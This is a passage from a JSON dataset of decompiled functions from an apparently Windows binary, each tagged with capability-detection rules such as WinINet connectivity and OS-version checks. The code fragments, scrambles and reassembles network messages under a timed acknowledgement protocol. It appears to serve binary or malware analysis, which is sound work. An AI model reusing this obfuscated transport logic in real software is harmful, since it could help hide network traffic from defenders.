        "decompiled_code": "\nvoid fcn.0005b300(int64_t **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t **ppiVar7;\n    int64_t **ppiVar8;\n    \n    if ((1 < arg2) && (ppiVar7 = arg1,  arg1 != NULL)) {\n        do {\n            iVar5 = fcn.00061a9e();\n            iVar6 = 0;\n            ppiVar8 = arg1;\n            do {\n                if (iVar6 == iVar5 % arg2) break;\n                ppiVar8 = *ppiVar8;\n                iVar6 = iVar6 + 1;\n            } while (ppiVar8 != NULL);\n            if (ppiVar8 == NULL) {\n                return;\n            }\n            if ((ppiVar8 != ppiVar7) && (*(ppiVar8 + 0x14) != *(ppiVar7 + 0x14))) {\n                piVar1 = ppiVar8[1];\n                piVar2 = *ppiVar8;\n                piVar3 = *ppiVar7;\n                piVar4 = ppiVar8[2];\n                *ppiVar8 = piVar3;\n                ppiVar8[1] = ppiVar7[1];\n                ppiVar8[2] = ppiVar7[2];\n                ppiVar7[1] = piVar1;\n                ppiVar7[2] = piVar4;\n                *ppiVar7 = piVar3;\n                *ppiVar8 = piVar2;\n            }\n            ppiVar7 = *ppiVar7;\n        } while (ppiVar7 != NULL);\n    }\n    return;\n}\n",
        "token_count": 405
    },
    "0005b3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005b3b0(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t **ppiVar2;\n    uint32_t uVar3;\n    int64_t **ppiVar4;\n    int32_t iVar5;\n    int64_t **ppiVar6;\n    int32_t iVar7;\n    uint64_t arg3_00;\n    uint8_t auStackX8 [24];\n    uint32_t uStackX32;\n    uint16_t auStack168 [4];\n    int64_t **ppiStack160;\n    int64_t iStack152;\n    ulong ****ppppuStack144;\n    uint8_t *puStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    ulong ***pppuStack112;\n    int64_t *piStack104;\n    uint64_t uStack96;\n    ulong ****ppppuStack88;\n    uint16_t *puStack80;\n    ulong uStack72;\n    \n    arg3_00 = arg4;\n    ppiStack160 = NULL;\n    if (*(arg1 + 0x10) == 0) {\n        return 0x21590003;\n    }\n    uStackX32 = arg4;\n    if (*(arg1 + 0x40) == 0) {\n        arg2 = fcn.0005aff0(arg2, arg3);\n        iStack120 = arg2;\n        if (arg2 == 0) {\n            return 0x21590004;\n        }\n    }\n    else {\n        iStack120 = 0;\n    }\n    arg1_00 = iStack120;\n    iVar1 = fcn.0005b184(arg1, arg2, arg3, &ppiStack160);\n    if (iVar1 != 0) {\n        fcn.0002fc50(arg1_00);\n        return iVar1;\n    }\n    ppiVar6 = ppiStack160;\n    if (0x7ffe < iStack152) {\n        while (ppiVar6 != NULL) {\n            ppiVar4 = *ppiVar6;\n            fcn.0002fc50(ppiVar6);\n            ppiVar6 = ppiVar4;\n        }\n        return 0x2159000b;\n    }\n    if (iStack152 < 0x10) {\n        iVar1 = fcn.00061a9e();\n        ppiVar6 = ppiStack160;\n        iVar5 = iVar1 % 7 + 1;\n        for (ppiVar4 = ppiStack160; iVar1 = 1,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n            *(ppiVar4 + 0x14) = iVar5;\n            iVar1 = fcn.00061a9e();\n            uVar3 = iVar1 >> 0x1f & 7;\n            iVar5 = iVar5 + 1 + ((iVar1 + uVar3 & 7) - uVar3);\n        }\n    }\n    else {\n        if (iStack152 < 0x7f) {\n            iVar5 = 1;\n            for (ppiVar4 = ppiStack160; iVar1 = 1,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n                *(ppiVar4 + 0x14) = iVar5;\n                iVar5 = iVar5 + 1;\n            }\n            goto code_r0x0005b4e0;\n        }\n        iVar1 = 0;\n        if (0xff < iStack152) {\n            iVar5 = 1;\n            for (ppiVar4 = ppiStack160; ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n                *(ppiVar4 + 0x14) = iVar5;\n                iVar5 = iVar5 + 1;\n            }\n            goto code_r0x0005b4e0;\n        }\n        iVar1 = fcn.00061a9e();\n        ppiVar6 = ppiStack160;\n        uVar3 = iVar1 >> 0x1f & 0x7f;\n        iVar5 = ((uVar3 + iVar1 & 0x7f) - uVar3) + 1;\n        for (ppiVar4 = ppiStack160; iVar1 = 0,  ppiVar4 != NULL; ppiVar4 = *ppiVar4) {\n            *(ppiVar4 + 0x14) = iVar5;\n            iVar1 = fcn.00061a9e();\n            uVar3 = iVar1 >> 0x1f & 0x7f;\n            iVar5 = iVar5 + 1 + ((iVar1 + uVar3 & 0x7f) - uVar3);\n        }\n    }\n    arg3_00 = uStackX32;\ncode_r0x0005b4e0:\n    fcn.0005b300(ppiVar6, iStack152);\n    ppppuStack88 = NULL;\n    puStack80 = NULL;\n    uStack72 = 0;\n    pppuStack112 = NULL;\n    piStack104 = NULL;\n    uStack96 = 0;\n    iStack152 = arg1 + 0x48;\n    ppppuStack144 = NULL;\n    puStack136 = NULL;\n    uStack128 = 0;\n    iVar5 = 0;\n    fcn.0002f23c(iStack152);\n    ppiStack160 = iVar1;\n    ppiVar4 = ppiVar6;\n    if (ppiVar6 != NULL) {\n        while( true ) {\n            if (ppiStack160 == NULL) {\n                auStackX8[0] = 0xff;\n                auStack168[0] = *(ppiVar4 + 0x14);\n                if (*ppiVar4 == NULL) {\n                    auStack168[0] = auStack168[0] | 0x8000;\n                }\n                puStack136 = auStackX8;\n                uStack128 = CONCAT44(uStack128._4_4_, 1);\n                ppppuStack144 = &ppppuStack88;\n                auStack168[0] = fcn.0002fd20();\n                uStack72 = CONCAT44(uStack72._4_4_, 2);\n                puStack80 = auStack168;\n                ppppuStack88 = &pppuStack112;\n            }\n            else {\n                auStackX8[0] = *(ppiVar4 + 0x14);\n                if (*ppiVar4 == NULL) {\n                    auStackX8[0] = auStackX8[0] | 0x80;\n                }\n                puStack136 = auStackX8;\n                uStack128 = CONCAT44(uStack128._4_4_, 1);\n                ppppuStack144 = &pppuStack112;\n            }\n            piStack104 = ppiVar4[1];\n            uStack96 = uStack96 & 0xffffffff00000000 | *(ppiVar4 + 2);\n            if (*(ppiVar4 + 2) == *(arg1 + 0x14) || *(ppiVar4 + 2) < *(arg1 + 0x14)) break;\n            iVar5 = 0x2159000b;\ncode_r0x0005b6f5:\n            if (iVar5 == 0x2159000b) {\n                if (*(arg1 + 0x14) == *(arg1 + 0x18)) {\n                    *(arg1 + 0x18) = 0;\n                }\n                else if (*(ppiVar4 + 2) < *(arg1 + 0x14)) {\n                    *(arg1 + 0x14) = *(ppiVar4 + 2);\n                }\n                iVar1 = *(ppiVar4 + 2);\n                iVar5 = (*(arg1 + 0x18) + *(arg1 + 0x14)) / 2;\n                if ((iVar1 <= iVar5) || (iVar7 = iVar5,  iVar5 <= iVar1 + (iVar1 >> 0x1f & 3U) >> 2)) {\n                    iVar7 = iVar1 / 2;\n                }\n                iVar1 = iVar1 - iVar7;\n                if ((0x400 < iVar7) && (iVar1 + 0x400 <= iVar5)) {\n                    iVar1 = fcn.00061a9e();\n                    iVar7 = iVar7 - iVar1 % 0x401;\n                    iVar1 = *(ppiVar4 + 2) - iVar7;\n                }\n                if ((0x400 < iVar1) && (iVar7 + 0x400 <= iVar5)) {\n                    iVar5 = fcn.00061a9e();\n                    iVar1 = iVar1 - iVar5 % 0x401;\n                    iVar7 = *(ppiVar4 + 2) - iVar1;\n                }\n                ppiVar2 = fcn.0002fbc4(0x18);\n                if (ppiVar2 == NULL) {\n                    iVar5 = 0x21590004;\n                    goto code_r0x0005b844;\n                }\n                *ppiVar2 = NULL;\n                ppiVar2[1] = NULL;\n                ppiVar2[2] = NULL;\n                *(ppiVar2 + 2) = iVar1;\n                *(ppiVar2 + 0x14) = *(ppiVar4 + 0x14);\n                iVar5 = 0;\n                ppiVar2[1] = iVar7 + ppiVar4[1];\n                *(ppiVar4 + 2) = iVar7;\n                *ppiVar2 = *ppiVar4;\n                *ppiVar4 = ppiVar2;\n            }\n            else {\n                if (*(arg1 + 0x18) < *(ppiVar4 + 2)) {\n                    *(arg1 + 0x18) = *(ppiVar4 + 2);\n                }\n                ppiVar4 = *ppiVar4;\n            }\n            if (ppiVar4 == NULL) goto code_r0x0005b850;\n            arg3_00 = uStackX32;\n        }\n        iVar5 = fcn.0006052c(*(arg1 + 8), &ppppuStack144, arg3_00);\n        if ((iVar5 == 0) || (iVar5 == 0x2159000b)) goto code_r0x0005b6f5;\ncode_r0x0005b844:\n        if (ppiVar4 != ppiVar6) {\n            *(arg1 + 0x10) = 0;\n        }\n    }\ncode_r0x0005b850:\n    fcn.0002f2a4(iStack152);\n    while (ppiVar6 != NULL) {\n        ppiVar4 = *ppiVar6;\n        fcn.0002fc50(ppiVar6);\n        ppiVar6 = ppiVar4;\n    }\n    fcn.0002fc50(iStack120);\n    return iVar5;\n}\n",
        "token_count": 2432
    },
    "0005b890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005b890(int64_t arg1, int64_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    uint8_t *arg1_00;\n    int64_t **ppiVar12;\n    uint8_t uVar13;\n    int64_t iVar14;\n    int64_t **arg1_01;\n    uint32_t uVar15;\n    int32_t iVar16;\n    uint8_t *puVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint32_t uVar20;\n    int64_t iVar21;\n    int64_t iVar22;\n    ushort uStackX9;\n    uint32_t auStack120 [2];\n    uint8_t *puStack112;\n    int64_t iStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    \n    puStack112 = NULL;\n    if (*(arg1 + 0x10) == 0) {\n        return 0x21590003;\n    }\n    *arg2 = 0;\n    fcn.0002f23c(arg1 + 0x50);\n    arg1_01 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = 0;\ncode_r0x0005b8df:\n    iVar6 = fcn.00060288(*(arg1 + 8), &puStack112, auStack120, arg4);\n    if (iVar6 != 0) goto code_r0x0005bb23;\n    if (auStack120[0] == 0) {\ncode_r0x0005bb19:\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        if (*puStack112 != 0xff) {\n            iVar16 = 1;\n            uVar5 = *puStack112 >> 7;\n            uVar20 = *puStack112 & 0x7f;\ncode_r0x0005b9e3:\n            if ((arg1_01 == NULL) || (*(arg1_01 + 0x14) != uVar20)) {\n                ppiVar9 = fcn.0002fbc4(0x18);\n                if (ppiVar9 != NULL) {\n                    *ppiVar9 = NULL;\n                    ppiVar9[1] = NULL;\n                    ppiVar9[2] = NULL;\n                    piVar8 = fcn.0002fbc4(auStack120[0] - iVar16);\n                    ppiVar9[1] = piVar8;\n                    if (piVar8 != NULL) {\n                        *(ppiVar9 + 0x14) = uVar20;\n                        *(ppiVar9 + 2) = auStack120[0] - iVar16;\n                        fcn.000619f6(piVar8, puStack112 + iVar16, auStack120[0] - iVar16);\n                        *ppiVar9 = arg1_01;\n                        goto code_r0x0005baeb;\n                    }\n                    fcn.0002fc50(ppiVar9);\n                }\ncode_r0x0005bb12:\n                iVar6 = 0x21590004;\n                goto code_r0x0005bb32;\n            }\n            iVar1 = *(arg1_01 + 2);\n            iVar7 = (*(arg1_01 + 2) - iVar16) + auStack120[0];\n            uVar19 = iVar7;\n            if (iVar7 == 0) {\n                fcn.0002fc50(arg1_01[1]);\n                arg1_01[1] = NULL;\n            }\n            else {\n                piVar8 = fcn.0002fbc4(uVar19);\n                if (piVar8 == NULL) goto code_r0x0005bb12;\n                uVar10 = iVar1;\n                if (uVar19 < iVar1) {\n                    uVar10 = uVar19;\n                }\n                fcn.000619f6(piVar8, arg1_01[1], uVar10);\n                fcn.0002fc50(arg1_01[1]);\n                arg1_01[1] = piVar8;\n            }\n            fcn.000619f6(*(arg1_01 + 2) + arg1_01[1], puStack112 + iVar16, auStack120[0] - iVar16);\n            *(arg1_01 + 2) = *(arg1_01 + 2) + (auStack120[0] - iVar16);\n            ppiVar9 = arg1_01;\ncode_r0x0005baeb:\n            arg1_01 = ppiVar9;\n            if (uVar5 != 0) goto code_r0x0005bb32;\n            fcn.0005fde8(*(arg1 + 8), puStack112);\n            puStack112 = NULL;\n            goto code_r0x0005b8df;\n        }\n        if (auStack120[0] < 3) goto code_r0x0005bb19;\n        uVar4 = fcn.0002fd20();\n        iVar16 = 3;\n        uVar20 = uVar4 & 0x7fff;\n        uVar5 = uVar4 >> 0xf;\n        if (uVar4 != 0xffff) goto code_r0x0005b9e3;\n        if (auStack120[0] == 3) goto code_r0x0005bb1c;\n        if (puStack112[3] != 1) {\ncode_r0x0005b9ba:\n            fcn.0005fde8(*(arg1 + 8), puStack112);\n            goto code_r0x0005b8df;\n        }\n        if (auStack120[0] == 6) {\n            uStackX9 = *(puStack112 + 3) >> 8;\n            uVar5 = fcn.0002fd20(uStackX9);\n            if (uVar5 != 0) {\n                *(arg1 + 0x18) = uVar5;\n                *(arg1 + 0x14) = uVar5;\n                goto code_r0x0005b9ba;\n            }\n        }\n    }\ncode_r0x0005bb1c:\n    iVar6 = 0x2159000a;\n    goto code_r0x0005bb32;\ncode_r0x0005bb23:\n    if (iVar6 == 0x21590002) {\n        *(arg1 + 0x58) = arg1_01;\n        arg1_01 = NULL;\n    }\ncode_r0x0005bb32:\n    fcn.0002f2a4(arg1 + 0x50);\n    fcn.0005fde8(*(arg1 + 8), puStack112);\n    uVar19 = 0;\n    if (iVar6 == 0) {\n        piVar8 = *arg1_01;\n        ppiVar9 = arg1_01;\n        while (uVar10 = uVar19,  ppiVar12 = arg1_01,  piVar8 != NULL) {\n            for (ppiVar12 = *ppiVar9; ppiVar12 != NULL; ppiVar12 = *ppiVar12) {\n                if (*(ppiVar9 + 0x14) != *(ppiVar12 + 0x14) && *(ppiVar12 + 0x14) <= *(ppiVar9 + 0x14)) {\n                    piStack88 = ppiVar12[1];\n                    piStack96 = *ppiVar12;\n                    piVar8 = *ppiVar9;\n                    piStack80 = ppiVar12[2];\n                    *ppiVar12 = piVar8;\n                    ppiVar12[1] = ppiVar9[1];\n                    ppiVar12[2] = ppiVar9[2];\n                    ppiVar9[1] = piStack88;\n                    ppiVar9[2] = piStack80;\n                    *ppiVar9 = piVar8;\n                    *ppiVar12 = piStack96;\n                }\n            }\n            ppiVar9 = *ppiVar9;\n            piVar8 = *ppiVar9;\n        }\n        do {\n            auStack120[0] = uVar10 + *(ppiVar12 + 2);\n            ppiVar12 = *ppiVar12;\n            uVar10 = auStack120[0];\n        } while (ppiVar12 != NULL);\n        iVar11 = fcn.0002fbc4(auStack120[0]);\n        *arg2 = iVar11;\n        if (iVar11 == 0) {\n            iVar6 = 0x21590004;\n        }\n        else {\n            auStack120[0] = 0;\n            uVar10 = uVar19;\n            ppiVar9 = arg1_01;\n            do {\n                fcn.000619f6(uVar10 + *arg2, ppiVar9[1], *(ppiVar9 + 2));\n                uVar20 = auStack120[0] + *(ppiVar9 + 2);\n                uVar10 = uVar20;\n                ppiVar9 = *ppiVar9;\n                auStack120[0] = uVar20;\n            } while (ppiVar9 != NULL);\n            if (*(arg1 + 0x40) == 0) {\n                iVar11 = *arg2;\n                if (10 < uVar20) {\n                    iVar14 = uVar20;\n                    iStack104 = iVar14;\n                    arg1_00 = fcn.0002fbc4(iVar14);\n                    if (arg1_00 == NULL) {\n                        iVar6 = 0x21590004;\n                        goto code_r0x0005bc82;\n                    }\n                    fcn.000619f6(arg1_00, iVar11, iVar14);\n                    fcn.00061a56();\n                    uVar10 = uVar19;\n                    uVar18 = uVar20;\n                    do {\n                        uVar2 = uVar18 / 10;\n                        uVar15 = uVar10 + uVar18 % 10;\n                        uVar10 = uVar15;\n                        uVar18 = uVar2;\n                    } while (0 < uVar2);\n                    iVar6 = 1;\n                    iVar22 = 1;\n                    iVar21 = uVar20 / uVar15;\n                    if (0 < iVar21) {\n                        uVar13 = *arg1_00;\n                        uVar10 = uVar19;\n                        do {\n                            iVar16 = 0;\n                            do {\n                                if (0 < uVar15) {\n                                    puVar17 = uVar19 + iVar11;\n                                    iVar14 = uVar15;\n                                    do {\n                                        *puVar17 = *puVar17 |\n                                                   ((1 << (uVar10 & 0x1f) & uVar13) >> (uVar10 & 0x1f)) <<\n                                                   (iVar16 & 0x1f);\n                                        uVar20 = uVar10 + 1;\n                                        uVar10 = uVar20;\n                                        if (7 < uVar20) {\n                                            uVar13 = arg1_00[iVar22];\n                                            iVar6 = iVar6 + 1;\n                                            iVar22 = iVar22 + 1;\n                                            uVar10 = 0;\n                                        }\n                                        puVar17 = puVar17 + iVar21;\n                                        iVar14 = iVar14 + -1;\n                                    } while (iVar14 != 0);\n                                }\n                                iVar16 = iVar16 + 1;\n                            } while (iVar16 < 8);\n                            uVar19 = uVar19 + 1;\n                            iVar14 = iStack104;\n                        } while (uVar19 < iVar21);\n                    }\n                    iVar21 = iVar6 + -1;\n                    if (iVar21 < iVar14) {\n                        puVar17 = iVar21 + iVar11;\n                        iVar22 = iVar21;\n                        do {\n                            iVar3 = iVar22 - iVar21;\n                            iVar22 = iVar22 + 1;\n                            *puVar17 = puVar17[arg1_00 - iVar11] ^ arg1_00[iVar3];\n                            puVar17 = puVar17 + 1;\n                        } while (iVar22 < iVar14);\n                    }\n                    fcn.0002fc50(arg1_00);\n                }\n                iVar6 = 0;\n            }\n            *arg3 = auStack120[0];\n        }\n    }\ncode_r0x0005bc82:\n    ppiVar9 = arg1_01;\n    if (arg1_01 != NULL) {\n        do {\n            fcn.0002fc50(ppiVar9[1]);\n            ppiVar9 = *ppiVar9;\n        } while (ppiVar9 != NULL);\n        while (arg1_01 != NULL) {\n            ppiVar9 = *arg1_01;\n            fcn.0002fc50(arg1_01);\n            arg1_01 = ppiVar9;\n        }\n    }\n    if (iVar6 != 0) {\n        fcn.0002fc50(*arg2);\n        *arg2 = 0;\n        *arg3 = 0;\n    }\n    return iVar6;\n}\n",
        "token_count": 2969
    },
    "0005c620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0005c620(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    char *pcVar6;\n    ulong auStackX8 [4];\n    uint64_t in_stack_ffffffffffffff98;\n    int32_t aiStack56 [2];\n    uint64_t uStack48;\n    \n    if (*(arg1 + 0x28) == 0) {\n        uVar4 = 0x21590065;\n    }\n    else {\n        iVar5 = *(arg1 + 0x68);\n        *(arg1 + 0x68) = 0;\n        if (iVar5 != 0) {\n            iVar5 = -1;\n            pcVar6 = *(arg1 + 0x70);\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            uVar4 = fcn.0005c620(arg1, *(arg1 + 0x70), ~iVar5);\n            if (uVar4 != 0) {\n                return uVar4;\n            }\n        }\n        iVar3 = arg3 & 0xffffffff;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            iVar2 = fcn.00061ae6(auStackX8, 0x10000000, 0, 1, in_stack_ffffffffffffff98 & 0xffffffffffffff00);\n            if (iVar2 == 0) {\n                iVar2 = fcn.00061a08(*(arg1 + 0x28), auStackX8[0], 0, 0, aiStack56, arg2, iVar3, 0, 0);\n                if ((iVar2 == 0x103) && (iVar3 = fcn.00061aa4(auStackX8[0], 0, 0),  iVar2 = aiStack56[0],  iVar3 != 0))\n                {\n                    fcn.000619de(auStackX8[0]);\n                    iVar2 = iVar3;\n                }\n                else {\n                    fcn.000619de(auStackX8[0]);\n                    if (iVar2 == 0) {\n                        if (uStack48 != (arg3 & 0xffffffff)) {\n                            return 0xffffffff;\n                        }\n                    }\n                    else if ((iVar2 == -0x3ffffeb5) || (iVar2 == -0x3fffff50)) {\n                        return 0x21590003;\n                    }\n                }\n            }\n            uVar4 = fcn.00061a5c(iVar2);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 644
    },
    "0005d118": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005d118(int64_t arg1, ulong arg2, uint8_t *arg3, int64_t *arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    bool bVar10;\n    uint16_t uStackX8;\n    uint8_t uStackX10;\n    int32_t iStackX16;\n    uint8_t *puStackX24;\n    int64_t *piStackX32;\n    int32_t *in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint8_t uStack88;\n    uint8_t uStack87;\n    uint32_t uStack84;\n    ushort *apuStack80 [2];\n    \n    iVar9 = 0;\n    apuStack80[0] = NULL;\n    iVar5 = *(arg1 + 0x14);\n    puStackX24 = arg3;\n    piStackX32 = arg4;\n    iStackX16 = arg2;\n    iVar2 = *0xfffff78000000320;\njoined_r0x0005d149:\n    *0xfffff78000000320 = iVar2;\n    if (iVar5 != 0) {\n        iVar5 = 0x21590006;\ncode_r0x0005d7e3:\n        fcn.0005fde8(*(arg1 + 8), apuStack80[0]);\n        return iVar5;\n    }\n    if (*(arg1 + 0x10) == 0) {\ncode_r0x0005d823:\n        iVar5 = 0x21590003;\n        goto code_r0x0005d7e3;\n    }\n    if ((*(arg1 + 0x68) != 0) && (*(arg1 + 0x18) == 3)) {\n        uVar4 = (**0x112f0)();\n        uVar6 = *(arg1 + 0x5c);\n        iVar5 = *(arg1 + 0xa8);\n        uVar7 = fcn.00061a9e();\n        if ((uVar7 & 0xffffffff) % uVar6 + 1 + (uVar6 >> 1) < (iVar2 * uVar4) / 10000 - iVar5) {\n            uStackX8 = uStackX8 & 0xff00 | *(arg1 + 0x1c);\n            uStackX10 = fcn.00061a9e();\n            uStackX8 = CONCAT11(0x10, uStackX8);\n            iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n            iVar2 = *0xfffff78000000320;\n            if (iVar5 != 0) goto code_r0x0005d7e3;\n            uVar6 = (**0x112f0)();\n            *(arg1 + 0xa8) = (uVar6 * iVar2) / 10000;\n        }\n    }\n    iVar2 = *0xfffff78000000320;\n    uVar4 = (**0x112f0)();\n    iVar3 = *0xfffff78000000320;\n    uVar6 = *(arg1 + 0x5c) * *(arg1 + 0x58);\n    uVar4 = (iVar2 * uVar4) / 10000 - *(arg1 + 0xac);\n    if (uVar4 < uVar6) {\n        uVar6 = uVar6 - uVar4;\n    }\n    else {\n        uVar6 = 0;\n    }\n    bVar10 = in_stack_00000030 < uVar6;\n    if (bVar10) {\n        uVar6 = in_stack_00000030;\n    }\n    if (in_stack_00000030 != 0xffffffff) {\n        uVar4 = (**0x112f0)();\n        iVar9 = (uVar4 * iVar3) / 10000;\n    }\n    iVar5 = fcn.00060288(*(arg1 + 8), apuStack80, &uStack84, uVar6);\n    iVar2 = *0xfffff78000000320;\n    if (in_stack_00000030 != 0xffffffff) {\n        uVar6 = (**0x112f0)();\n        uVar6 = (uVar6 * iVar2) / 10000 - iVar9;\n        if (uVar6 < in_stack_00000030) {\n            in_stack_00000030 = in_stack_00000030 - uVar6;\n        }\n        else {\n            in_stack_00000030 = 0;\n        }\n    }\n    iVar2 = *0xfffff78000000320;\n    if (iVar5 != 0) {\n        if (iVar5 != 0x21590002) goto code_r0x0005d7e3;\n        uVar6 = (**0x112f0)();\n        if (*(arg1 + 0x5c) * *(arg1 + 0x58) <= (iVar2 * uVar6) / 10000 - *(arg1 + 0xac)) {\n            *(arg1 + 0x10) = 0;\n            goto code_r0x0005d7e3;\n        }\n        if ((bVar10) || (in_stack_00000030 == 0)) goto code_r0x0005d7e3;\n        goto code_r0x0005d7d4;\n    }\n    if (uStack84 < 3) {\n        if ((*(arg1 + 0x18) == 2) || (*(arg1 + 0x18) == 1)) {\ncode_r0x0005d3ec:\n            iVar5 = 0x2159000a;\n            goto code_r0x0005d7e3;\n        }\n        fcn.0005fde8(*(arg1 + 8), apuStack80[0]);\n    }\n    else {\n        uVar1 = *(apuStack80[0] + 1);\n        uStack87 = *apuStack80[0] >> 8;\n        uStack88 = *apuStack80[0];\n        uStack87 = uStack87 ^ uVar1 >> 1;\n        uStack88 = uStack88 ^ uVar1 >> 1;\n        if ((uStack87 & 0x40) == 0) {\n            uVar6 = (**0x112f0)();\n            iVar5 = *(arg1 + 0x18);\n            *(arg1 + 0xac) = (uVar6 * iVar2) / 10000;\n            if ((((iVar5 == 2) || (iVar5 == 1)) && ((uStack87 & 1) == 0)) && ((uStack87 & 0x20) == 0)) {\n                if (iVar5 == 2) goto code_r0x0005d7ae;\n                uStackX8 = CONCAT11(0x20, uStack88);\n            }\n            else {\n                if (((iVar5 != 0) || ((uStack87 & 2) != 0)) || ((uStack87 & 0x20) != 0)) {\n                    if ((((iVar5 == 1) && ((uStack87 & 1) != 0)) && ((uStack87 & 4) == 0)) ||\n                       ((iVar5 == 3 && ((((uStack87 & 0x10) != 0 || ((uStack87 & 1) != 0)) && ((uStack87 & 4) == 0))))))\n                    {\n                        uStackX8 = CONCAT11(uStack87, uStack88) | 0x400;\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n                        if (iVar5 != 0) goto code_r0x0005d7e3;\n                        if (((uStack87 & 1) != 0) && (*(arg1 + 0x18) == 1)) {\n                            *(arg1 + 0x18) = 3;\n                            *(arg1 + 0x1d) = uStack88 + 1;\n                        }\n                    }\n                    iVar5 = iStackX16;\n                    if (((*(arg1 + 0x18) == 3) || (*(arg1 + 0x18) == 2)) &&\n                       (((uStack87 & 4) != 0 && (((uStack87 & 0x10) == 0 && (uStack88 == *(arg1 + 0x1c))))))) {\n                        if (((uStack87 & 1) != 0) && (*(arg1 + 0x18) == 2)) {\n                            *(arg1 + 0x18) = 3;\n                        }\n                        if (iStackX16 != 1) {\n                            fcn.0002f23c(arg1 + 0x70);\n                            *(arg1 + 0x88) = uVar1;\n                            *(arg1 + 0x8c) = 1;\n                            fcn.0002ee20(arg1 + 0x80);\n                            fcn.0002f2a4(arg1 + 0x70);\n                            goto code_r0x0005d5c0;\n                        }\n                        *puStackX24 = uVar1;\ncode_r0x0005d818:\n                        iVar5 = 0;\n                        goto code_r0x0005d7e3;\n                    }\ncode_r0x0005d5c0:\n                    if (((uStack87 & 0x20) != 0) && ((uStack88 == *(arg1 + 0x1c) || (uStack88 == *(arg1 + 0x1d))))) {\n                        *(arg1 + 0x18) = 0;\n                        goto code_r0x0005d823;\n                    }\n                    if ((*(arg1 + 0x18) == 3) && ((uStack87 & 8) != 0)) {\n                        if (uStack88 == *(arg1 + 0x1d)) {\n                            if (iVar5 == 2) {\n                                uStackX8 = CONCAT11(4, uStack88);\n                                uStackX10 = uVar1;\n                                iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n                                if (iVar5 == 0) {\n                                    *(arg1 + 0x1d) = *(arg1 + 0x1d) + '\\x01';\n                                    iVar9 = apuStack80[0] + 3;\n                                    apuStack80[0] = NULL;\n                                    *piStackX32 = iVar9;\n                                    *in_stack_00000028 = uStack84 - 3;\n                                    goto code_r0x0005d818;\n                                }\n                            }\n                            else {\n                                fcn.0002f23c(arg1 + 0x70);\n                                if (*(arg1 + 0x14) == 0) {\n                                    if (*(arg1 + 0x10) != 0) {\n                                        if ((uStack84 + *(arg1 + 0xa0) < 0x100000) &&\n                                           (puVar8 = fcn.0002fbc4(0x18),  puVar8 != NULL)) {\n                                            uStackX8 = CONCAT11(4, uStack88);\n                                            uStackX10 = uVar1;\n                                            iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n                                            if (iVar5 != 0) goto code_r0x0005d836;\n                                            *puVar8 = 0;\n                                            puVar8[1] = 0;\n                                            puVar8[2] = 0;\n                                            puVar8[1] = apuStack80[0];\n                                            *(puVar8 + 2) = uStack84;\n                                            apuStack80[0] = NULL;\n                                            if (*(arg1 + 0x98) == NULL) {\n                                                *(arg1 + 0x90) = puVar8;\n                                            }\n                                            else {\n                                                **(arg1 + 0x98) = puVar8;\n                                            }\n                                            *(arg1 + 0x98) = puVar8;\n                                            *(arg1 + 0xa0) = *(arg1 + 0xa0) + uStack84;\n                                            fcn.0002ee20(arg1 + 0x80);\n                                            *(arg1 + 0x1d) = *(arg1 + 0x1d) + 